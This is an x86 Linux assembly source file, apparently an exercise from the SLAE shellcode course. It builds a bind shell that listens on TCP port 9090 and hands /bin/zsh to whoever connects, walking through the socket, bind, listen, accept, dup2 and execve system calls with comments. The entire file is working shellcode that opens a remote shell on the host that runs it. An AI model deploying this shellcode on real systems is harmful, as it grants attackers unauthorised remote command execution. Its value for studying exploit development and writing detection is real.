;
; Linux x86
; Author:  thryb
; Date:    13-07-16
; Purpose: Bind /bin/zsh to TCP port 9090
; Size:    XX bytes
; ID:      SLAE-770
;

global _start

section .text
_start:

	xor eax, eax ; cleaning registers for sanity
        xor ebx, ebx
        xor edx, edx
        xor edi, edi

	; 1 - create socket
	; socket(AF_INET, SOCK_STREAM, 0);
	; #define SYS_SOCKET      1               /* sys_socket(2) */
	
	push eax ; null
	mov al, 0x66 ; sys_socketcall = 102
	mov bl, 0x1 ; socketcall() socket = 1
	push byte 0x1 ; stack = 0, 1
	push byte 0x2 ; stack = 0, 1, 2 (0, SOCK_STREAM, AF_INET)
	mov ecx, esp ; mov stack ptr to ecx
	int 0x80 ; init

	; 2 - Bind port
 	; bind(fd, (struct sockaddr *) &s_addr, 16);
 	; #define SYS_BIND        2               /* sys_bind(2) */

	xchg edi, eax ; transfer fd to edi 
 	mov al, 0x66 ; sys_socketcall = 102
 	pop ebx ; sys_bind = 2
 	pop esi  ; = 1
 	push edx ; stack = [0]
	push word 0x8223 ; stack = [0, port_num]
	push word bx ; stack = [0, port_num, 2]
	push byte 16 ; stack = [0, port_num, 2], 16
	push ecx ; stack = [0, port_num, 2], 16, pointer
	push edi ; stack = [0, port_num, 2], 16, *ptr, fd
 	mov ecx, esp ; move stack ptr to ecx
 	int 0x80 ; init

	; 3 - Listen
	; listen(fd, 1);
	; #define SYS_LISTEN      4               /* sys_listen(2) */
	
	pop edx ; save fd
	mov al, 0x66 ; sys_socketcall = 102
	add bl, 0x2 ; bl + 2 (bl 2 from bind) 
	int 0x80 ; init

	; 4 - Accept
	; accept(fd, NULL, NULL);
	; #define SYS_ACCEPT      5               /* sys_accept(2) */

	push eax ; 0 - NULL
	push eax ; 0 - NULL
	mov al, 0x66 ; sys_socketcall = 102
	inc ebx ; make 5 for listen (4 from listen)
	push edx ; push fd on stack
	mov ecx, esp ; move stack ptr to ecx
	int 0x80 ; init

	; 5 - dup
	; sys_dup2 = 63 = 0x3f

	xchg eax, ebx	; ebx = fd / eax = 5
	xor ecx, ecx	; NULL ecx
	add cl, 0x2	; add 2 to counter
 
	dup2: ; STDIN, STDOUT, STDERR
		mov al, 0x3f	; sys_dup2
		int 0x80	; init
		dec cl		; decrement counter
		jns dup2	; Jump on No Sign (Positive)
 
	; 6 - execve /bin/zsh
	; normal execve shell exec

	push eax		
	push 0x68737a2f	; hsz/
	push 0x6e69622f	; nib/

	mov ebx, esp		

        push eax		
        mov edx, esp		

        push ebx
        mov ecx, esp

        mov al, 0xb	; sys_execve (11)	
        int 0x80	; init

